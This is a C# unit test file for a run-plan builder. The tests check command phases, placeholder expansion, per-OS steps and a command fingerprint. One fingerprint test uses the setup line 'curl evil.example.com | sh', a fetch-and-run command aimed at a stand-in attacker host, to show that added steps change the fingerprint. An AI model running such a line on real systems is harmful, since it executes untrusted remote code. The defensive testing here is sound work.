using QuickRun.Core.Config;
using QuickRun.Core.Run;

namespace QuickRun.Core.Tests;

public class RunPlanTests
{
    private static InterpolationContext Ctx(params (string, string?)[] inputs) =>
        new(inputs.ToDictionary(i => i.Item1, i => i.Item2), "/w/acme__app__main", "app", "main", _ => null);

    private static RunPlan Plan(string yaml, OSKind os = OSKind.Linux, params (string, string?)[] inputs) =>
        RunPlanBuilder.Build(ConfigParser.Parse(yaml, os), Ctx(inputs), os,
            "https://github.com/acme/app", "main", "abc1234");

    [Fact]
    public void A_single_run_command_becomes_one_planned_task()
    {
        var command = Assert.Single(Plan("run: ./run.sh").Commands);
        Assert.Equal("task", command.Phase);
        Assert.Equal("run", command.Name);
        Assert.Equal("./run.sh", command.Command);
    }

    [Fact]
    public void Setup_tasks_and_stop_appear_in_that_order()
        => Assert.Equal(new[] { "setup", "task", "stop" },
            Plan("setup: [npm ci]\ntasks: [npm start]\nstop: [docker compose down]").Commands.Select(c => c.Phase));

    [Fact]
    public void Placeholders_are_expanded_in_the_plan()
        => Assert.Equal("./app --key sk-1",
            Plan("inputs:\n  - id: apiKey\nrun: ./app --key ${inputs.apiKey}", inputs: ("apiKey", "sk-1"))
                .Commands[0].Command);

    [Fact]
    public void Workspace_placeholder_is_expanded()
        => Assert.Equal("ls /w/acme__app__main", Plan("run: ls ${workspace}").Commands[0].Command);

    [Fact]
    public void Steps_excluded_by_when_are_not_in_the_plan()
    {
        var yaml = string.Join("\n",
            "setup:",
            "  - run: apt-get install -y libfoo",
            "    when: linux",
            "  - run: brew install foo",
            "    when: macos",
            "run: ./app");

        Assert.Equal(new[] { "apt-get install -y libfoo", "./app" },
            Plan(yaml, OSKind.Linux).Commands.Select(c => c.Command));
        Assert.Equal(new[] { "brew install foo", "./app" },
            Plan(yaml, OSKind.MacOs).Commands.Select(c => c.Command));
    }

    [Fact]
    public void Cwd_is_carried_into_the_plan()
        => Assert.Equal("web", Plan("tasks:\n  - run: npm run dev\n    cwd: web").Commands[0].Cwd);

    [Fact]
    public void DisplayName_falls_back_to_the_repository_name()
    {
        Assert.Equal("app", Plan("run: ./a").DisplayName);
        Assert.Equal("My App", Plan("name: My App\nrun: ./a").DisplayName);
    }

    [Fact]
    public void The_fingerprint_is_stable_for_the_same_commands()
        => Assert.Equal(Plan("run: ./run.sh").Fingerprint, Plan("run: ./run.sh").Fingerprint);

    [Fact]
    public void The_fingerprint_changes_when_a_command_changes()
        => Assert.NotEqual(Plan("run: ./run.sh").Fingerprint, Plan("run: ./evil.sh").Fingerprint);

    [Fact]
    public void The_fingerprint_changes_when_a_setup_step_is_added()
        => Assert.NotEqual(Plan("run: ./run.sh").Fingerprint,
            Plan("setup: [curl evil.example.com | sh]\nrun: ./run.sh").Fingerprint);

    [Fact]
    public void The_fingerprint_ignores_the_commit()
    {
        var config = ConfigParser.Parse("run: ./run.sh", OSKind.Linux);
        var a = RunPlanBuilder.Build(config, Ctx(), OSKind.Linux, "https://github.com/acme/app", "main", "aaaaaaa");
        var b = RunPlanBuilder.Build(config, Ctx(), OSKind.Linux, "https://github.com/acme/app", "main", "bbbbbbb");
        Assert.Equal(a.Fingerprint, b.Fingerprint);
    }

    [Fact]
    public void The_fingerprint_differs_between_platforms_when_the_commands_differ()
    {
        const string yaml = "run:\n  linux: ./run.sh\n  windows: ./run.ps1\n  macos: ./run.sh";
        Assert.NotEqual(Plan(yaml, OSKind.Linux).Fingerprint, Plan(yaml, OSKind.Windows).Fingerprint);
    }

    [Fact]
    public void Describe_names_the_repository_the_ref_the_commit_and_every_command()
    {
        var text = Plan("setup: [npm ci]\ntasks: [npm start]").Describe();
        Assert.Contains("https://github.com/acme/app", text);
        Assert.Contains("main", text);
        Assert.Contains("abc1234", text);
        Assert.Contains("npm ci", text);
        Assert.Contains("npm start", text);
    }

    [Fact]
    public void Describe_survives_a_short_commit_string()
    {
        var config = ConfigParser.Parse("run: ./a", OSKind.Linux);
        var plan = RunPlanBuilder.Build(config, Ctx(), OSKind.Linux, "r", "main", "abc");
        Assert.Contains("abc", plan.Describe());
    }

    [Fact]
    public void Requires_and_inputs_travel_with_the_plan()
    {
        var plan = Plan("requires:\n  - tool: node\n    version: \">=20\"\ninputs:\n  - id: k\nrun: ./a");
        Assert.Equal("node", Assert.Single(plan.Requires).Tool);
        Assert.Equal("k", Assert.Single(plan.Inputs).Id);
    }
}
